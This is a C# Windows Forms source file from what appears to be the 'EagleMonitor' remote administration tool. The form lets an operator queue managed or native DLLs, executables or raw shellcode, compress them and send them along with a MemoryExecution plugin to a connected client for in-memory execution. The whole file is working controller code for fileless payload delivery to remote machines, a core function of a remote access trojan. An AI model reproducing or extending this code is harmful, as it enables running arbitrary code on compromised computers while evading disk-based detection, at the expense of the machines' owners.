using EagleMonitor.Controls;
using EagleMonitor.Networking;
using EagleMonitor.Utils;
using PacketLib;
using PacketLib.Packet;
using System;
using System.IO;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Forms
{
    public partial class MemoryExecutionForm : FormPattern
    {
        internal ClientHandler clientHandler { get; set; }

        internal MemoryExecutionForm(ClientHandler clientHandler)
        {
            this.clientHandler = clientHandler;
            InitializeComponent();
        }

        private enum PayloadType : ushort 
        {
            MANAGED_DLL =   0,
            MANAGED_EXE =   1,
            NATIVE_DLL =    2,
            NATIVE_EXE =    3,
            SHELLCODE =     4
        }

        private void listView1_DragDrop(object sender, DragEventArgs e)
        {
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
            foreach (string file in files)
            {
                ListViewItem payload = new ListViewItem(Miscellaneous.SplitPath(file));
                payload.Tag = file;

                string payloadType = Microsoft.VisualBasic.Interaction.InputBox("Payload type :" +
                    "\nMANAGED_DLL  =    0" +
                    "\nMANAGED_EXE  =    1" +
                    "\nNATIVE_DLL   =    2" +
                    "\nNATIVE_EXE   =    3" +
                    "\nSHELLCODE    =    4", file);

                switch ((PayloadType)ushort.Parse(payloadType)) 
                {
                    case PayloadType.MANAGED_DLL:
                        payload.ImageIndex = 1;
                        break;

                    case PayloadType.NATIVE_DLL:
                        payload.ImageIndex = 1;
                        break;

                    case PayloadType.MANAGED_EXE:
                        payload.ImageIndex = 0;
                        break;

                    case PayloadType.NATIVE_EXE:
                        payload.ImageIndex = 0;
                        break;

                    case PayloadType.SHELLCODE:
                        payload.ImageIndex = 2;
                        break;

                    default:
                        return;

                }
                payload.SubItems.Add(((PayloadType)ushort.Parse(payloadType)).ToString());
                listView1.Items.Add(payload);   
            }
        }

        private void listView1_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.Move;
        }

        private void removeFromListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem payload in listView1.SelectedItems)
                payload.Remove();
        }

        private void sendPayloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem payload in listView1.SelectedItems) 
            {
                MemoryExecutionPacket memoryExecutionPacket = null;
                switch (Enum.Parse(typeof(PayloadType), payload.SubItems[1].Text)) 
                {
                    case PayloadType.MANAGED_DLL:
                        memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_MANAGED_DLL, Compressor.QuickLZ.Compress(File.ReadAllBytes(payload.Tag.ToString()), 1));
                        memoryExecutionPacket.managedEntryPoint = Microsoft.VisualBasic.Interaction.InputBox("DLL Entrypoint(Namespace.Class.Function):");
                        break;

                    case PayloadType.NATIVE_DLL:
                        memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_NATIVE_DLL, Compressor.QuickLZ.Compress(File.ReadAllBytes(payload.Tag.ToString()), 1));
                        break;

                    case PayloadType.MANAGED_EXE:
                        memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_MANAGED_PE, Compressor.QuickLZ.Compress(File.ReadAllBytes(payload.Tag.ToString()), 1));
                        break;

                    case PayloadType.NATIVE_EXE:
                        memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_NATIVE_PE, Compressor.QuickLZ.Compress(File.ReadAllBytes(payload.Tag.ToString()), 1));
                        break;

                    case PayloadType.SHELLCODE:
                        memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_SHELLCODE, Compressor.QuickLZ.Compress(File.ReadAllBytes(payload.Tag.ToString()), 1));
                        break;
                }

                if (memoryExecutionPacket != null)
                {
                    memoryExecutionPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\MemoryExecution.dll"), 1);
                    clientHandler.SendPacket(memoryExecutionPacket);
                }
                //MessageBox.Show(Enum.Parse(typeof(PayloadType), payload.SubItems[1].Text).ToString());
            }
        }

        private void addPayloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog()) 
            {
                if (ofd.ShowDialog() == DialogResult.OK) {
                    foreach (string file in ofd.FileNames)
                    {
                        ListViewItem payload = new ListViewItem(Miscellaneous.SplitPath(file));
                        payload.Tag = file;

                        string payloadType = Microsoft.VisualBasic.Interaction.InputBox("Payload type :" +
                            "\nMANAGED_DLL  =    0" +
                            "\nMANAGED_EXE  =    1" +
                            "\nNATIVE_DLL   =    2" +
                            "\nNATIVE_EXE   =    3" +
                            "\nSHELLCODE    =    4", file);

                        switch ((PayloadType)ushort.Parse(payloadType))
                        {
                            case PayloadType.MANAGED_DLL:
                                payload.ImageIndex = 1;
                                break;

                            case PayloadType.NATIVE_DLL:
                                payload.ImageIndex = 1;
                                break;

                            case PayloadType.MANAGED_EXE:
                                payload.ImageIndex = 0;
                                break;

                            case PayloadType.NATIVE_EXE:
                                payload.ImageIndex = 0;
                                break;

                            case PayloadType.SHELLCODE:
                                payload.ImageIndex = 2;
                                break;

                            default:
                                return;

                        }
                        payload.SubItems.Add(((PayloadType)ushort.Parse(payloadType)).ToString());
                        listView1.Items.Add(payload);
                    }
                }
            }
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void MemoryExecutionForm_Load(object sender, EventArgs e)
        {

        }

        private void label2_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.FindForm().Handle, 161, 2, 0);
        }
    }
}
